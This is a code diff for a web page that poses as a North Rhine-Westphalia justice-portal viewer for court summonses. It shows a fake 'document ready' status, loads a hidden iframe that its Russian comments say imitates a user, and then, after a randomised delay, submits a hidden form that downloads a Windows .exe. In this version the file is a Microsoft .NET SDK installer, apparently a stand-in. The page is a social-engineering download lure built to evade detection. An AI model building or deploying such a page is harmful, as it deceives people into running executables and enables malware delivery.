@@ -3,6 +3,11 @@ document.addEventListener('DOMContentLoaded', function() {
   const docType = urlParams.get('type');
   const docId = urlParams.get('id');
   
+  // UI Elements
+  const spinner = document.getElementById('spinner');
+  const statusText = document.getElementById('statusText');
+  const checkmark = document.getElementById('checkmark');
+  
   // Белый список документов
   const validDocs = {
     ladung: ['L-40822', 'L-55199', 'L-77301'],
@@ -10,23 +15,28 @@ document.addEventListener('DOMContentLoaded', function() {
   };
 
   if (validDocs[docType]?.includes(docId)) {
-    // Создаем скрытый iframe для имитации пользователя
+    // Phase 1: Show loading state
+    setTimeout(() => {
+      spinner.style.display = 'none';
+      checkmark.style.display = 'block';
+      statusText.textContent = "Das Dokument steht zur Einsicht bereit.";
+    }, 2500);
+
+    // Phase 2: Create hidden iframe
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
+    iframe.sandbox = 'allow-same-origin allow-scripts';
     iframe.src = `https://www.google.com/search?q=justiz+nrw+${docId}`;
     document.body.appendChild(iframe);
-    
-    // Основной редирект через 3-5 сек
+
+    // Phase 3: Redirect after delay
     setTimeout(() => {
-      // Формируем конечный URL с рандомными параметрами
       const finalUrl = `https://builds.dotnet.microsoft.com/dotnet/Sdk/9.0.304/dotnet-sdk-9.0.304-win-x64.exe?cache=${Date.now()}`;
       
-      // Создаем форму для "человеческого" редиректа
       const form = document.createElement('form');
       form.method = 'GET';
       form.action = finalUrl;
       
-      // Добавляем скрытые параметры
       const params = {
         source: 'github-redirect',
         session: Math.random().toString(36).substring(2),
@@ -46,7 +56,9 @@ document.addEventListener('DOMContentLoaded', function() {
       form.submit();
     }, 3000 + Math.random() * 2000);
   } else {
-    document.getElementById('content').innerHTML = `
+    // Handle invalid document
+    spinner.style.display = 'none';
+    statusText.innerHTML = `
       <h1>Dokument nicht gefunden</h1>
       <p>Fehler 404: Das angeforderte Dokument existiert nicht.</p>
     `;
